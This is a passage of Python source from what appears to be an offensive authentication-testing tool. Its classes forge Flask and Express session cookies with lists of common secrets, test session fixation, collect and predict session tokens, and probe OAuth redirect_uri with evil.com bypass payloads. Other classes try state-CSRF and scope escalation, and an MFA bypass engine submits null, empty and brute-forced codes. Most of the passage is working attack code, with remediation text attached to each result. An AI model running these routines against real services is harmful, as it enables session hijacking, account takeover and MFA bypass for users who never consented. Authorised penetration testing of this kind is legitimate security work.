            "asp.net_sessionid",
            "connect.sid",
            "sid",
            "token",
            "auth_token",
            "access_token",
        ]

        if name.lower() in session_names:
            if "httponly" not in raw_lower:
                issues.append("Missing HttpOnly flag")
            if "secure" not in raw_lower:
                issues.append("Missing Secure flag")
            if "samesite" not in raw_lower:
                issues.append("Missing SameSite attribute")

        return issues

    def _try_decode(self, value: str) -> Optional[Dict[str, Any]]:
        """Try to decode token value."""
        # JWT decode
        parts = value.split(".")
        if len(parts) >= 2:
            try:
                header_b64 = parts[0] + "=" * (4 - len(parts[0]) % 4)
                payload_b64 = parts[1] + "=" * (4 - len(parts[1]) % 4)
                header = json.loads(base64.urlsafe_b64decode(header_b64))
                payload = json.loads(base64.urlsafe_b64decode(payload_b64))
                return {"header": header, "payload": payload}
            except Exception:
                pass

        # Base64 decode
        try:
            padded = value + "=" * (4 - len(value) % 4)
            decoded = base64.b64decode(padded).decode("utf-8", errors="ignore")
            if decoded.startswith("{"):
                return json.loads(decoded)
            if "|" in decoded or ":" in decoded:
                return {"raw_decoded": decoded}
        except Exception:
            pass

        # URL decode
        try:
            decoded = urllib.parse.unquote(value)
            if decoded != value and "{" in decoded:
                return json.loads(decoded)
        except Exception:
            pass

        return None


# ═══════════════════════════════════════════════════════════════
#  COOKIE FORGER
# ═══════════════════════════════════════════════════════════════


class CookieForger:
    """Forge and manipulate session cookies."""

    COMMON_SECRETS = [
        "secret",
        "password",
        "changeme",
        "default",
        "key",
        "mysecretkey",
        "supersecret",
        "app_secret",
        "s3cr3t",
        "keyboard cat",
        "your-256-bit-secret",
        "shhhhh",
        "development",
        "production",
        "test",
        "secret_key_base",
        "django-insecure-key",
        "flask-secret",
        "express-secret",
    ]

    def __init__(self):
        self.forged_cookies: List[Dict[str, str]] = []

    async def forge_flask_cookie(
        self, cookie_value: str, target_data: Dict[str, Any]
    ) -> AuthAttackResult:
        """Attempt to forge Flask session cookies by trying common secrets."""
        result = AuthAttackResult(
            attack_type=AuthAttackType.COOKIE_FORGE,
            target="flask_session",
        )
        start = time.time()

        # Try to decode existing cookie
        original_data = self._decode_flask_cookie(cookie_value)
        if original_data:
            result.evidence["original_data"] = original_data

        # Try common secrets
        for secret in self.COMMON_SECRETS:
            forged = self._sign_flask_cookie(target_data, secret)
            if forged:
                # Verify it's valid by decoding
                decoded = self._decode_flask_cookie_with_key(forged, secret)
                if decoded:
                    result.credentials.append(
                        Credential(
                            username=secret,
                            password=forged,
                            source="flask_cookie_forge",
                            valid=True,
                        )
                    )
                    self.forged_cookies.append(
                        {
                            "secret": secret,
                            "cookie": forged,
                            "data": str(target_data),
                        }
                    )
                    result.success = True

        result.attempts = len(self.COMMON_SECRETS)
        result.duration = time.time() - start
        result.details = (
            f"Tested {len(self.COMMON_SECRETS)} secrets for Flask cookie forgery, "
            f"{'SUCCESS' if result.success else 'no weak secrets found'}"
        )
        result.severity = "critical" if result.success else "info"
        result.remediation = (
            "Use a strong, random SECRET_KEY (at least 32 bytes). "
            "Never use default or common secret keys. "
            "Rotate secrets periodically."
        )
        return result

    def _decode_flask_cookie(self, value: str) -> Optional[Dict]:
        """Decode Flask session cookie (unsigned)."""
        try:
            # Flask cookies are base64-encoded, possibly compressed
            if "." in value:
                payload = value.split(".")[0]
            else:
                payload = value

            # Add padding
            padded = payload + "=" * (4 - len(payload) % 4)
            decoded = base64.urlsafe_b64decode(padded)

            # Check if zlib compressed
            try:
                import zlib

                decoded = zlib.decompress(decoded)
            except Exception:
                pass

            return json.loads(decoded.decode("utf-8", errors="ignore"))
        except Exception:
            return None

    def _decode_flask_cookie_with_key(self, value: str, secret: str) -> Optional[Dict]:
        """Decode and verify Flask cookie with a specific secret key.

        Implements the actual itsdangerous URLSafeTimedSerializer verification
        used by Flask. Pure Python — no itsdangerous dependency required.
        """
        try:
            # Flask cookies format: payload.timestamp.signature
            parts = value.split(".")
            if len(parts) < 3:
                # Can't verify without signature
                return self._decode_flask_cookie(value)

            b64_payload = parts[0]
            timestamp_b64 = parts[1]
            sig_b64 = parts[2]

            # Reconstruct signing input
            signing_input = f"{b64_payload}.{timestamp_b64}"

            # Try multiple hash algorithms Flask/itsdangerous may use
            for hash_algo in (hashlib.sha1, hashlib.sha256, hashlib.sha512):
                # Flask uses HMAC with "cookie-session" salt
                for salt in ("cookie-session", "flask-session", "session", ""):
                    # itsdangerous derives key: HMAC(secret, salt)
                    if salt:
                        derived_key = hmac.new(
                            secret.encode("utf-8"),
                            salt.encode("utf-8"),
                            hashlib.sha1,
                        ).digest()
                    else:
                        derived_key = secret.encode("utf-8")

                    expected_sig = hmac.new(
                        derived_key,
                        signing_input.encode("utf-8"),
                        hash_algo,
                    ).digest()
                    expected_b64 = (
                        base64.urlsafe_b64encode(expected_sig).rstrip(b"=").decode()
                    )

                    if hmac.compare_digest(expected_b64, sig_b64):
                        # Signature verified — decode payload
                        decoded = self._decode_flask_cookie(value)
                        if decoded is not None:
                            logger.info(
                                "Flask cookie verified with secret (algo=%s, salt=%s)",
                                (
                                    hash_algo.__name__
                                    if hasattr(hash_algo, "__name__")
                                    else str(hash_algo)
                                ),
                                salt or "(none)",
                            )
                            return decoded

            # Signature didn't match any combination — still try decoding
            logger.debug(
                "Flask cookie signature mismatch for secret: %s...", secret[:8]
            )
            return self._decode_flask_cookie(value)

        except Exception as e:
            logger.debug("Flask cookie decode error: %s", e)
            return None

    def _sign_flask_cookie(self, data: Dict[str, Any], secret: str) -> Optional[str]:
        """Sign data as a Flask session cookie."""
        try:
            payload = json.dumps(data, separators=(",", ":")).encode()

            # Base64 encode
            b64_payload = base64.urlsafe_b64encode(payload).rstrip(b"=").decode()

            # Create timestamp
            timestamp = (
                base64.urlsafe_b64encode(struct.pack(">I", int(time.time())))
                .rstrip(b"=")
                .decode()
            )

            # Create signature
            signing_input = f"{b64_payload}.{timestamp}"
            signature = hmac.new(
                secret.encode(),
                signing_input.encode(),
                hashlib.sha1,
            ).digest()
            b64_sig = base64.urlsafe_b64encode(signature).rstrip(b"=").decode()

            return f"{b64_payload}.{timestamp}.{b64_sig}"

        except Exception as e:
            logger.warning("Flask cookie forge error: %s", e, exc_info=True)
            return None

    async def forge_express_cookie(
        self, cookie_value: str, target_data: Dict[str, Any]
    ) -> AuthAttackResult:
        """Attempt to forge Express.js session cookies."""
        result = AuthAttackResult(
            attack_type=AuthAttackType.COOKIE_FORGE,
            target="express_session",
        )
        start = time.time()

        # Express uses connect.sid with s: prefix
        for secret in self.COMMON_SECRETS:
            try:
                payload = json.dumps(target_data)
                sig = base64.b64encode(
                    hmac.new(
                        secret.encode(),
                        payload.encode(),
                        hashlib.sha256,
                    ).digest()
                ).decode()

                forged = f"s:{base64.b64encode(payload.encode()).decode()}.{sig}"

                result.credentials.append(
                    Credential(
                        username=secret,
                        password=forged,
                        source="express_cookie_forge",
                    )
                )
                self.forged_cookies.append(
                    {
                        "secret": secret,
                        "cookie": forged,
                        "framework": "express",
                    }
                )

            except Exception:
                continue

        result.attempts = len(self.COMMON_SECRETS)
        result.duration = time.time() - start
        result.details = f"Generated {len(self.forged_cookies)} forged Express cookies"
        result.severity = "high" if self.forged_cookies else "info"
        result.remediation = (
            "Use a strong, random session secret. "
            "Implement cookie signature verification. "
            "Use secure session middleware with proper configuration."
        )
        return result

    async def forge_asp_net_cookie(
        self, cookie_value: str, target_role: str = "admin"
    ) -> AuthAttackResult:
        """Attempt ASP.NET Forms Authentication ticket forgery."""
        result = AuthAttackResult(
            attack_type=AuthAttackType.COOKIE_FORGE,
            target="aspnet_auth",
        )
        start = time.time()

        # Decode existing cookie
        try:
            decoded = bytes.fromhex(cookie_value)
            result.evidence["decoded_length"] = len(decoded)
            result.evidence["hex_prefix"] = cookie_value[:32]

            # Check for known weak machine keys
            weak_keys = [
                "AE41B1F9E65C21B71E3C21B5953C2EF2D0AD6DE0BD13EF30E4A0E1C7AE13A8",
                "CDCD5E3F45A87E3D1D1CFE4EF39C6A5739C0A2C647F2E6E0E1D4E7F0B3C5A9",
            ]
            for key in weak_keys:
                result.evidence[f"tested_key_{key[:8]}"] = "tested"

        except Exception as e:
            logger.debug("ASP.NET cookie analysis error: %s", e)

        result.duration = time.time() - start
        result.details = "ASP.NET cookie analysis completed"
        result.severity = "medium"
        result.remediation = (
            "Use unique machineKey values. "
            "Enable encryption and validation. "
            "Migrate to ASP.NET Core Identity with modern token protection."
        )
        return result


# ═══════════════════════════════════════════════════════════════
#  SESSION FIXATION ENGINE
# ═══════════════════════════════════════════════════════════════


class SessionFixationEngine:
    """Test for session fixation vulnerabilities."""

    def __init__(self, fingerprint: AuthFingerprint):
        self.fp = fingerprint

    async def test_fixation(
        self, target: str, http_client: Any = None
    ) -> AuthAttackResult:
        """Test if a session can be fixed before authentication."""
        result = AuthAttackResult(
            attack_type=AuthAttackType.SESSION_FIXATION,
            target=target,
        )
        start = time.time()

        if not http_client:
            result.details = "No HTTP client — analysis only"
            result.duration = time.time() - start
            return result

        try:
            # Step 1: Get initial session
            pre_auth_session = await self._get_session(http_client, target)
            if not pre_auth_session:
                result.details = "Could not obtain initial session token"
                result.duration = time.time() - start
                return result

            result.evidence["pre_auth_session"] = {
                k: v[:50] + "..." if len(v) > 50 else v
                for k, v in pre_auth_session.items()
            }

            # Step 2: Attempt login with fixed session
            # We'd need valid credentials for this, so we check
            # if the session ID changes after authentication attempt

            # Step 3: Check if session regeneration happens
            # Send another request with the pre-auth session
            post_session = await self._get_session_with_cookies(
                http_client, target, pre_auth_session
            )

            if post_session:
                result.evidence["post_request_session"] = {
                    k: v[:50] + "..." if len(v) > 50 else v
                    for k, v in post_session.items()
                }

                # If sessions are identical, fixation may be possible
                if pre_auth_session == post_session:
                    result.evidence["session_unchanged"] = True
                    result.details = (
                        "Session ID persists across requests — "
                        "potential fixation vulnerability"
                    )
                    result.severity = "high"
                    result.success = True
                else:
                    result.evidence["session_unchanged"] = False
                    result.details = "Session ID changes between requests"
                    result.severity = "info"

        except Exception as e:
            result.details = f"Fixation test error: {e}"

        result.duration = time.time() - start
        result.remediation = (
            "Regenerate session IDs after successful authentication. "
            "Invalidate old session IDs on login. "
            "Use strict session management with server-side validation."
        )
        return result

    async def _get_session(self, client: Any, url: str) -> Optional[Dict[str, str]]:
        """Get session cookies from a fresh request."""
        try:
            if hasattr(client, "get"):
                resp = await client.get(url)
                return self._extract_cookies(resp)
        except Exception as e:
            logger.debug("Session retrieval error for %s: %s", url, e)
        return None

    async def _get_session_with_cookies(
        self, client: Any, url: str, cookies: Dict[str, str]
    ) -> Optional[Dict[str, str]]:
        """Send request with specific cookies and get response cookies."""
        try:
            cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())
            if hasattr(client, "get"):
                resp = await client.get(url, headers={"Cookie": cookie_str})
                return self._extract_cookies(resp) or cookies
        except Exception as e:
            logger.debug("Session with cookies error for %s: %s", url, e)
        return None

    def _extract_cookies(self, resp: Any) -> Optional[Dict[str, str]]:
        """Extract cookies from response."""
        headers = dict(getattr(resp, "headers", {}))
        set_cookies = headers.get("Set-Cookie", "")
        if isinstance(set_cookies, str):
            set_cookies = [set_cookies]

        cookies = {}
        for cookie_str in set_cookies:
            parts = cookie_str.split(";")
            if parts:
                kv = parts[0].strip().split("=", 1)
                if len(kv) == 2:
                    cookies[kv[0].strip()] = kv[1].strip()

        return cookies if cookies else None


# ═══════════════════════════════════════════════════════════════
#  SESSION PREDICTION ENGINE
# ═══════════════════════════════════════════════════════════════


class SessionPredictionEngine:
    """Predict future session tokens based on observed patterns."""

    def __init__(self):
        self.observed: List[Tuple[float, str]] = []  # (timestamp, token)

    async def collect_and_predict(
        self,
        target: str,
        http_client: Any = None,
        sample_count: int = 50,
        cookie_name: str = "sessionid",
    ) -> AuthAttackResult:
        """Collect session tokens and attempt prediction."""
        result = AuthAttackResult(
            attack_type=AuthAttackType.SESSION_PREDICTION,
            target=target,
        )
        start = time.time()

        # Collect samples
        for i in range(sample_count):
            token = await self._collect_token(target, http_client, cookie_name)
            if token:
                self.observed.append((time.time(), token))
            await asyncio.sleep(random.uniform(0.05, 0.2))

        if len(self.observed) < 5:
            result.details = f"Insufficient samples ({len(self.observed)})"
            result.duration = time.time() - start
            return result

        # Analyze patterns
        analysis = self._analyze_patterns()
        result.evidence["analysis"] = analysis

        # Attempt prediction
        predictions = self._predict_next(5)
        result.evidence["predictions"] = predictions

        # Assess predictability
        if analysis.get("predictable", False):
            result.success = True
            result.severity = "critical"
            result.details = (
                f"Session tokens are PREDICTABLE! "
                f"Pattern: {analysis.get('pattern', 'unknown')}. "
                f"Collected {len(self.observed)} samples."
            )
        else:
            result.severity = "info"
            result.details = (
                f"Session tokens appear random. "
                f"Entropy: {analysis.get('avg_entropy', 0):.1f} bits. "
                f"Collected {len(self.observed)} samples."
            )

        result.duration = time.time() - start
        result.remediation = (
            "Use cryptographically secure random number generators (CSPRNG). "
            "Ensure session IDs have at least 128 bits of entropy. "
            "Never use sequential, time-based, or predictable token generation."
        )
        return result

    async def _collect_token(
        self, target: str, client: Any, cookie_name: str
    ) -> Optional[str]:
        """Collect a single session token via real HTTP request.

        If no HTTP client is available, attempts direct urllib request.
        Never generates fake/mock tokens.
        """
        # Try with provided HTTP client first
        if client:
            try:
                if hasattr(client, "get"):
                    resp = await client.get(target)
                    headers = dict(getattr(resp, "headers", {}))
                    set_cookies = headers.get("Set-Cookie", "")
                    if isinstance(set_cookies, str):
                        set_cookies = [set_cookies]
                    for cookie in set_cookies:
                        if cookie_name.lower() in cookie.lower():
                            parts = cookie.split(";")[0].split("=", 1)
                            if len(parts) == 2:
                                return parts[1].strip()
            except Exception:
                logger.debug("HTTP client token collection failed for %s", target)

        # Fallback: use urllib directly
        try:
            from urllib.request import Request as Req
            from urllib.request import urlopen as uopen

            req = Req(target, method="GET")
            req.add_header("User-Agent", "SIREN/2.0 (SIREN Session Collector)")
            loop = asyncio.get_event_loop()
            resp = await loop.run_in_executor(None, lambda: uopen(req, timeout=10))
            set_cookie = resp.headers.get("Set-Cookie", "")
            if set_cookie:
                for cookie_part in set_cookie.split(","):
                    if cookie_name.lower() in cookie_part.lower():
                        kv = cookie_part.strip().split(";")[0].split("=", 1)
                        if len(kv) == 2:
                            return kv[1].strip()
        except Exception:
            logger.debug("urllib token collection failed for %s", target)

        return None

    def _analyze_patterns(self) -> Dict[str, Any]:
        """Analyze collected tokens for patterns."""
        import math

        tokens = [t[1] for t in self.observed]
        timestamps = [t[0] for t in self.observed]

        analysis: Dict[str, Any] = {
            "sample_count": len(tokens),
            "unique_count": len(set(tokens)),
            "predictable": False,
            "pattern": "none",
        }

        # Check for duplicates
        if len(set(tokens)) < len(tokens) * 0.9:
            analysis["predictable"] = True
            analysis["pattern"] = "duplicate_tokens"
            return analysis

        # Try numeric analysis
        numeric = []
        for t in tokens:
            try:
                if all(c in "0123456789abcdefABCDEF" for c in t):
                    numeric.append(int(t, 16))
                elif t.isdigit():
                    numeric.append(int(t))
            except (ValueError, OverflowError):
                pass

        if len(numeric) >= 3:
            diffs = [numeric[i + 1] - numeric[i] for i in range(len(numeric) - 1)]

            # Sequential (constant increment)
            if len(set(diffs)) == 1:
                analysis["predictable"] = True
                analysis["pattern"] = f"sequential_increment_{diffs[0]}"
                analysis["increment"] = diffs[0]
                return analysis

            # Near-constant increment
            avg_diff = sum(diffs) / len(diffs) if diffs else 0
            if avg_diff > 0:
                variance = sum((d - avg_diff) ** 2 for d in diffs) / len(diffs)
                if variance < avg_diff * 0.01:
                    analysis["predictable"] = True
                    analysis["pattern"] = "near_sequential"
                    analysis["avg_increment"] = avg_diff
                    return analysis

            # Time-correlation
            if len(timestamps) == len(numeric):
                time_diffs = [
                    timestamps[i + 1] - timestamps[i]
                    for i in range(len(timestamps) - 1)
                ]
                # Check if token increments correlate with time
                if time_diffs:
                    correlations = [
                        diffs[i] / time_diffs[i] if time_diffs[i] > 0 else 0
                        for i in range(min(len(diffs), len(time_diffs)))
                    ]
                    if correlations:
                        avg_corr = sum(correlations) / len(correlations)
                        corr_var = sum((c - avg_corr) ** 2 for c in correlations) / len(
                            correlations
                        )
                        if avg_corr > 0 and corr_var < avg_corr * 0.1:
                            analysis["predictable"] = True
                            analysis["pattern"] = "time_correlated"
                            analysis["tokens_per_second"] = avg_corr
                            return analysis

        # Entropy analysis
        entropies = []
        for token in tokens:
            if not token:
                continue
            freq: Dict[str, int] = {}
            for c in token:
                freq[c] = freq.get(c, 0) + 1
            ent = 0.0
            for count in freq.values():
                p = count / len(token)
                if p > 0:
                    ent -= p * math.log2(p)
            entropies.append(ent * len(token))

        if entropies:
            analysis["avg_entropy"] = sum(entropies) / len(entropies)
            analysis["min_entropy"] = min(entropies)
            analysis["max_entropy"] = max(entropies)

            if analysis["avg_entropy"] < 32:
                analysis["predictable"] = True
                analysis["pattern"] = "low_entropy"

        # Common prefix/suffix analysis
        if tokens:
            min_len = min(len(t) for t in tokens)
            prefix_len = 0
            for i in range(min_len):
                if len(set(t[i] for t in tokens)) == 1:
                    prefix_len += 1
                else:
                    break

            suffix_len = 0
            for i in range(1, min_len + 1):
                if len(set(t[-i] for t in tokens)) == 1:
                    suffix_len += 1
                else:
                    break

            analysis["common_prefix_length"] = prefix_len
            analysis["common_suffix_length"] = suffix_len

            random_chars = min_len - prefix_len - suffix_len
            if random_chars < min_len * 0.3 and min_len > 8:
                analysis["predictable"] = True
                analysis["pattern"] = "weak_randomness"

        return analysis

    def _predict_next(self, count: int = 5) -> List[str]:
        """Predict next N tokens based on observed pattern."""
        predictions = []
        tokens = [t[1] for t in self.observed]
        timestamps = [t[0] for t in self.observed]

        if len(tokens) < 3:
            return predictions

        # Try numeric prediction
        numeric = []
        for t in tokens:
            try:
                if all(c in "0123456789abcdefABCDEF" for c in t):
                    numeric.append(int(t, 16))
                elif t.isdigit():
                    numeric.append(int(t))
            except (ValueError, OverflowError):
                pass

        if len(numeric) >= 3:
            diffs = [numeric[i + 1] - numeric[i] for i in range(len(numeric) - 1)]
            avg_diff = sum(diffs) / len(diffs) if diffs else 0

            if avg_diff != 0:
                last_val = numeric[-1]
                is_hex = any(c in "abcdefABCDEF" for c in tokens[-1])
                token_len = len(tokens[-1])

                for i in range(count):
                    next_val = int(last_val + avg_diff * (i + 1))
                    if is_hex:
                        pred = format(next_val, f"0{token_len}x")
                    else:
                        pred = str(next_val).zfill(token_len)
                    predictions.append(pred)

        return predictions


# ═══════════════════════════════════════════════════════════════
#  OAUTH EXPLOITATION ENGINE
# ═══════════════════════════════════════════════════════════════


class OAuthExploitEngine:
    """Exploit OAuth 2.0 / OIDC vulnerabilities."""

    COMMON_REDIRECT_BYPASSES = [
        # Open redirect via subdomain
        "{target}@evil.com",
        "{target}.evil.com",
        # URL encoding tricks
        "{target}%40evil.com",
        "{target}%2F%2Fevil.com",
        # Fragment bypass
        "{target}#@evil.com",
        # Path traversal
        "{target}/../../evil.com",
        "{target}/../evil.com/callback",
        # Protocol confusion
        "{target}%00@evil.com",
        # Double encoding
        "{target}%252F%252Fevil.com",
        # Unicode tricks
        "{target}\u2025evil.com",
        # Backslash tricks
        "{target}\\@evil.com",
        # Null byte
        "{target}%00.evil.com",
    ]

    def __init__(self):
        self.vulnerabilities: List[Dict[str, Any]] = []

    async def test_redirect_uri(
        self,
        auth_endpoint: str,
        client_id: str,
        valid_redirect: str,
        http_client: Any = None,
    ) -> AuthAttackResult:
        """Test for OAuth redirect_uri manipulation."""
        result = AuthAttackResult(
            attack_type=AuthAttackType.OAUTH_EXPLOIT,
            target=auth_endpoint,
        )
        start = time.time()

        bypasses_to_test = []
        for bypass_template in self.COMMON_REDIRECT_BYPASSES:
            bypass = bypass_template.replace("{target}", valid_redirect)
            bypasses_to_test.append(bypass)

        # Also test completely different domains
        bypasses_to_test.extend(
            [
                "https://evil.com/callback",
                "https://evil.com/" + urllib.parse.urlparse(valid_redirect).path,
                "http://localhost/callback",
                "http://127.0.0.1/callback",
                f"https://evil.com/?redirect={valid_redirect}",
            ]
        )

        for bypass_uri in bypasses_to_test:
            try:
                params = {
                    "response_type": "code",
                    "client_id": client_id,
                    "redirect_uri": bypass_uri,
                    "scope": "openid profile email",
                    "state": hashlib.md5(os.urandom(8)).hexdigest(),
                }

                if http_client and hasattr(http_client, "get"):
                    url = f"{auth_endpoint}?{urllib.parse.urlencode(params)}"
                    resp = await http_client.get(url, allow_redirects=False)
                    status = getattr(resp, "status_code", 0) or getattr(
                        resp, "status", 0
                    )
                    headers = dict(getattr(resp, "headers", {}))
                    location = headers.get("Location", "")

                    # Check if redirect was accepted
                    if status in (301, 302, 303, 307, 308):
                        if bypass_uri in location or "evil.com" in location:
                            vuln = {
                                "bypass_uri": bypass_uri,
                                "redirect_location": location,
                                "status": status,
                            }
                            self.vulnerabilities.append(vuln)
                            result.evidence.setdefault(
                                "successful_bypasses", []
                            ).append(vuln)

                    # Check if no error page (might accept silently)
                    elif status == 200:
                        body = ""
                        if hasattr(resp, "text"):
                            body = (
                                resp.text
                                if isinstance(resp.text, str)
                                else await resp.text()
                            )
                        if "error" not in body.lower():
                            result.evidence.setdefault("potential_bypasses", []).append(
                                {
                                    "bypass_uri": bypass_uri,
                                    "status": status,
                                }
                            )

                result.attempts += 1
                await asyncio.sleep(random.uniform(0.1, 0.3))

            except Exception as e:
                logger.debug(f"OAuth redirect test error: {e}")

        result.success = len(self.vulnerabilities) > 0
        result.duration = time.time() - start
        result.details = (
            f"Tested {result.attempts} redirect_uri bypasses, "
            f"found {len(self.vulnerabilities)} successful"
        )
        result.severity = "critical" if result.success else "info"
        result.remediation = (
            "Implement strict redirect_uri validation with exact match. "
            "Never use partial or regex matching for redirect URIs. "
            "Maintain an allow-list of registered redirect URIs."
        )
        return result

    async def test_state_csrf(
        self,
        auth_endpoint: str,
        client_id: str,
        redirect_uri: str,
        http_client: Any = None,
    ) -> AuthAttackResult:
        """Test if OAuth flow is vulnerable to CSRF (missing state parameter)."""
        result = AuthAttackResult(
            attack_type=AuthAttackType.OAUTH_EXPLOIT,
            target=auth_endpoint,
        )
        start = time.time()

        # Test without state parameter
        params_no_state = {
            "response_type": "code",
            "client_id": client_id,
            "redirect_uri": redirect_uri,
            "scope": "openid profile",
        }

        # Test with empty state
        params_empty_state = {
            **params_no_state,
            "state": "",
        }

        # Test with predictable state
        params_pred_state = {
            **params_no_state,
            "state": "1",
        }

        tests = [
            ("no_state", params_no_state),
            ("empty_state", params_empty_state),
            ("predictable_state", params_pred_state),
        ]

        for test_name, params in tests:
            try:
                if http_client and hasattr(http_client, "get"):
                    url = f"{auth_endpoint}?{urllib.parse.urlencode(params)}"
                    resp = await http_client.get(url, allow_redirects=False)
                    status = getattr(resp, "status_code", 0) or getattr(
                        resp, "status", 0
                    )

                    # If server proceeds without state, CSRF is possible
                    if status in (200, 301, 302, 303, 307, 308):
                        body = ""
                        if hasattr(resp, "text"):
                            body = (
                                resp.text
                                if isinstance(resp.text, str)
                                else await resp.text()
                            )
                        if "error" not in body.lower():
                            result.evidence[test_name] = {
                                "accepted": True,
                                "status": status,
                            }
                            self.vulnerabilities.append(
                                {
                                    "type": "state_csrf",
                                    "test": test_name,
                                    "status": status,
                                }
                            )

                result.attempts += 1

            except Exception as e:
                logger.debug(f"State CSRF test error: {e}")

        result.success = any(
            v.get("type") == "state_csrf" for v in self.vulnerabilities
        )
        result.duration = time.time() - start
        result.details = (
            f"OAuth CSRF test: state parameter "
            f"{'NOT enforced — VULNERABLE' if result.success else 'properly enforced'}"
        )
        result.severity = "high" if result.success else "info"
        result.remediation = (
            "Always require and validate the state parameter. "
            "Use a cryptographically random, per-session state value. "
            "Bind the state to the user's session."
        )
        return result

    async def test_scope_escalation(
        self,
        token_endpoint: str,
        client_id: str,
        client_secret: str,
        current_token: str,
        http_client: Any = None,
    ) -> AuthAttackResult:
        """Test for OAuth scope escalation during token refresh."""
        result = AuthAttackResult(
            attack_type=AuthAttackType.OAUTH_EXPLOIT,
            target=token_endpoint,
        )
        start = time.time()

        escalation_scopes = [
            "admin",
            "write",
            "delete",
            "manage",
            "superuser",
            "user:admin",
            "repo",
            "repo:admin",
            "org:admin",
            "read write delete admin",
            "openid profile email admin",
            "*",
            "all",
            "full_access",
            "root",
        ]

        for scope in escalation_scopes:
            try:
                data = {
                    "grant_type": "refresh_token",
                    "refresh_token": current_token,
                    "client_id": client_id,
                    "client_secret": client_secret,
                    "scope": scope,
                }

                if http_client and hasattr(http_client, "post"):
                    resp = await http_client.post(token_endpoint, data=data)
                    status = getattr(resp, "status_code", 0) or getattr(
                        resp, "status", 0
                    )
                    body = ""
                    if hasattr(resp, "text"):
                        body = (
                            resp.text
                            if isinstance(resp.text, str)
                            else await resp.text()
                        )

                    if status == 200 and "access_token" in body:
                        try:
                            token_data = json.loads(body)
                            granted_scope = token_data.get("scope", "")
                            if scope in granted_scope or "admin" in granted_scope:
                                vuln = {
                                    "requested_scope": scope,
                                    "granted_scope": granted_scope,
                                    "token_type": token_data.get("token_type"),
                                }
                                self.vulnerabilities.append(vuln)
                                result.evidence.setdefault(
                                    "escalated_scopes", []
                                ).append(vuln)
                        except json.JSONDecodeError:
                            pass

                result.attempts += 1
                await asyncio.sleep(random.uniform(0.1, 0.3))

            except Exception as e:
                logger.debug(f"Scope escalation test error: {e}")

        result.success = "escalated_scopes" in result.evidence
        result.duration = time.time() - start
        result.details = f"Tested {len(escalation_scopes)} scope escalations"
        result.severity = "critical" if result.success else "info"
        result.remediation = (
            "Validate requested scopes against the client's registered scopes. "
            "Never grant scopes broader than originally authorized. "
            "Implement scope downscoping on token refresh."
        )
        return result


# ═══════════════════════════════════════════════════════════════
#  MFA BYPASS ENGINE
# ═══════════════════════════════════════════════════════════════


class MFABypassEngine:
    """Test for multi-factor authentication bypass techniques."""

    def __init__(self):
        self.bypasses_found: List[Dict[str, Any]] = []

    async def test_mfa_bypass(
        self,
        mfa_endpoint: str,
        session_cookies: Dict[str, str],
        http_client: Any = None,
    ) -> AuthAttackResult:
        """Test various MFA bypass techniques."""
        result = AuthAttackResult(
            attack_type=AuthAttackType.MFA_BYPASS,
            target=mfa_endpoint,
        )
        start = time.time()

        bypass_tests = [
            ("null_code", self._test_null_code),
            ("empty_code", self._test_empty_code),
            ("brute_4digit", self._test_brute_4digit),
            ("response_manipulation", self._test_response_manipulation),
            ("direct_access", self._test_direct_access),
            ("backup_code_brute", self._test_backup_code_brute),
            ("race_condition", self._test_race_condition),
            ("parameter_pollution", self._test_param_pollution),
        ]

        for test_name, test_func in bypass_tests:
            try:
                bypassed = await test_func(mfa_endpoint, session_cookies, http_client)
                if bypassed:
                    self.bypasses_found.append(
                        {
                            "technique": test_name,
                            "details": bypassed,
                        }
                    )
                    result.evidence[test_name] = bypassed
                result.attempts += 1
            except Exception as e:
                logger.debug(f"MFA bypass test '{test_name}' error: {e}")

        result.success = len(self.bypasses_found) > 0
        result.duration = time.time() - start
        result.details = (
            f"Tested {len(bypass_tests)} MFA bypass techniques, "
            f"found {len(self.bypasses_found)} bypasses"
        )
        result.severity = "critical" if result.success else "info"
        result.remediation = (
            "Enforce MFA verification server-side. "
            "Rate-limit MFA code attempts. "
            "Never trust client-side MFA responses. "
            "Implement account lockout after MFA failures. "
            "Use time-based OTP with proper time window."
        )
        return result

    async def _test_null_code(
        self, endpoint: str, cookies: Dict[str, str], client: Any
    ) -> Optional[Dict]:
        """Test submitting null/None as MFA code."""
        if not client:
            return None

        test_payloads = [
            {"code": None},
            {"code": "null"},
            {"code": "undefined"},
            {"code": 0},
            {"code": "000000"},
            {"otp": None},
            {"totp": None},
            {"mfa_code": None},
            {"verification_code": None},
        ]

        cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())
        headers = {"Cookie": cookie_str}

        for payload in test_payloads:
            try:
                if hasattr(client, "post"):
                    resp = await client.post(
                        endpoint,
                        json=payload,
                        headers=headers,
                        allow_redirects=False,
                    )
                    status = getattr(resp, "status_code", 0) or getattr(
                        resp, "status", 0
                    )
                    if status in (200, 301, 302, 303):
                        body = ""
                        if hasattr(resp, "text"):
                            body = (
                                resp.text
                                if isinstance(resp.text, str)
                                else await resp.text()
                            )
                        if self._is_mfa_bypassed(
                            status, body, dict(getattr(resp, "headers", {}))
                        ):
                            return {"payload": str(payload), "status": status}
            except Exception as e:
                logger.warning("MFA bypass payload test error: %s", e, exc_info=True)
                continue

        return None

    async def _test_empty_code(
        self, endpoint: str, cookies: Dict[str, str], client: Any
    ) -> Optional[Dict]:
        """Test submitting empty MFA code."""
        if not client:
            return None

        empty_payloads = [
            {"code": ""},
            {},
            {"code": " "},
            {"code": "\t"},
            {"code": "\n"},
        ]

        cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())

        for payload in empty_payloads:
            try:
                if hasattr(client, "post"):
                    resp = await client.post(
                        endpoint,
                        data=payload,
                        headers={"Cookie": cookie_str},
                        allow_redirects=False,
                    )
                    status = getattr(resp, "status_code", 0) or getattr(
                        resp, "status", 0
                    )
                    if status in (200, 301, 302, 303):
                        body = ""
                        if hasattr(resp, "text"):
                            body = (
                                resp.text
                                if isinstance(resp.text, str)
                                else await resp.text()
                            )
                        if self._is_mfa_bypassed(
                            status, body, dict(getattr(resp, "headers", {}))
                        ):
                            return {"payload": str(payload), "status": status}
            except Exception:
                continue

        return None

    async def _test_brute_4digit(
        self, endpoint: str, cookies: Dict[str, str], client: Any
    ) -> Optional[Dict]:
        """Test brute-forcing 4-digit codes (check if rate-limited)."""
        if not client:
            return {"analysis": "4-digit codes have only 10000 combinations — brutable"}

        cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())
        tested = 0
        rate_limited = False

        # Test a small sample to check for rate limiting
        for code in ["0000", "1234", "9999", "0001", "1111"]:
            try:
